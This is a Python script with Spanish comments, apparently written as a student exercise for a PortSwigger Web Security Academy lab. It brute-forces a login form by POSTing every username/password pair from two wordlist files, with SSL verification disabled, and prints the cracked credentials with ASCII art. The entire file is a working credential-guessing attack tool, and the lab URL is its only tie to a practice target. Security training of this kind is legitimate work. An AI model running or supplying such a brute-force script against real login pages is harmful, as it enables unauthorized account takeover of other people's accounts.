import requests #importar libreria requests para crear solicitudes HTTP al servidor web
import os #modulo para el uso de los recursos del sistema operativo
import warnings #este modulo lo introduzco para eliminar las advertencias de seguridad

# Suprimir advertencias de urllib3 para no recibir advertencias de seguridad SSL
warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)

# Crear una sesión para reutilizar conexiones y acelerar el proceso
session = requests.Session()

#Cargar lista de usernames y passwords desde los archivos descargados.
def cargar_lista(archivo):
    with open(archivo, 'r') as f:
        return f.readlines()

#Vincular URL de la web
url_login = "https://0aaf00740488059a8106c1a6008f00a0.web-security-academy.net/login"

#Llamar los archivos de texto de usernames y passwords y asignarles id
archivo_usernames = "usuarios_noborrar.txt"
archivo_passwords = "passwords_db.txt"

#cargar las listas
usernames = cargar_lista(archivo_usernames)
passwords = cargar_lista(archivo_passwords)

#crear una función de fuerza bruta que tome tres parametros: url, username y password
def login_fuerza_bruta(url, usernames, passwords):
    #agregaré un contador de combinaciones para conocer el avance de la fuerza bruta en base al total de combinaciones posibles.
    total_combinaciones = len(usernames) * len(passwords)  # Total de combinaciones
    contador = 0  # Iniciamos el contador

    #crear bucles de intentos de claves y passwords.
    for password in passwords:
        for username in usernames:
          # Incrementamos el contador en cada intento
          contador += 1
          #preparación de datos para enviar al servidor como solicitud POST.
          datos = {
            'username': username.strip(),
            'password': password.strip()
          }

          #generamos la solicitud POST al servidor.
          respuesta = requests.post(url, data=datos, verify=False) #desactivé la verificación SSL con el fin de disminuir el tiempo de respuesta.
          location_header = respuesta.headers.get('Location', '')

          # Verificamos si el login fue exitoso
          
          if (
             "My Account" in respuesta.text
              or f'my-account?id={username}' in location_header
              or f'my-account?id={username}' in respuesta.text
          ):
            print(f"""
              ⠀⠀⠀⠀⢀⠠⠤⠀⢀⣿⡀
               ⠀⠐⠀⠐⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⠀⢀⣼⡇
              ⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⣴⣿⣿⠃⠀⠀⠀⠀¡LOGIN VULNERADO!
              ⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣇⠀⠀⢀⣾⣿⣿⣿⠀⠀⠀⠀⠀username: {username.strip()}
              ⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡟⠀⠀   password: {password.strip()}
              ⠀⠀⠀⠀⢰⡿⠉⠀⡜⣿⣿⣿⣿⣿⣿⣿⣿⠃.
              ⠀⠀⠒⠒⠸⣿⣄⢀⣃⣿⣿⡟⠉⠉⠉⢹⣿⡇⠀⠀⠀⠀⠀
              ⠀⠀⠚⠉⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠘⠠⠁⠀⠀
              ⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠛⠛⠁⠀⠒⠤⠀⠀⠀⠀
              ⠨⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀
              ⠁⠃⠉""")
            return
          if (
             respuesta.status_code == 503
             or respuesta.status_code == 403
          ):
             print(f"[{respuesta.status_code}] El servidor no está respondiendo o no se encuentra disponible. Verifique si el laboratorio de PortSwigger ha expirado. Si es así, actualice la URL con la del nuevo laboratorio.")
             return
          else:
            print(f"[{respuesta.status_code}] [{contador} de {total_combinaciones}] Login Incorrecto ☹ username: {username.strip()}, password: {password.strip()}")

#ejecutar
login_fuerza_bruta(url_login, usernames, passwords)

# CORRECCIONES:
# Al principio intenté usar el nombre de los archivos para llamrlos, pero esto no funcionó por lo que los cambié por la ruta, además añadí el modulo os
# Decidí poner un contador de intentos en base al total de combinaciones posibles.
#⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
# ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠀⠀⢀⠠⠤⠀⢀⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀⠐⠀⠐⠀⠀⢀⣾⣿⡇⠀⠀⠀⠀⠀⢀⣼⡇⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡇⠀⠀⠀⠀⣴⣿⣿⠃⠀⠀⠀⠀
#⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣇⠀⠀⢀⣾⣿⣿⣿⠀⠀⠀⠀⠀~~~~~~~~~~~~~~⠀DIEGO MORALES TUR - NAVILAX ~~~~~~~~~~~~~~~
#⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⡟⠀⠀     ~~~~~~~~~~~~~~⠀PARA HACKMETRIX ACADEMY ~~~~~~~~~~~~~~~
#⠀⠀⠀⠀⢰⡿⠉⠀⡜⣿⣿⣿⣿⣿⣿⣿⣿⠃.
#⠀⠀⠒⠒⠸⣿⣄⢀⣃⣿⣿⡟⠉⠉⠉⢹⣿⡇⠀⠀⠀⠀⠀
#⠀⠀⠚⠉⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠘⠠⠁⠀⠀
#⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠛⠛⠛⠛⠁⠀⠒⠤⠀⠀⠀⠀
#⠨⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠀⠀⠀⠀
#⠁⠃⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
#⠀⠀   ⠀⠀
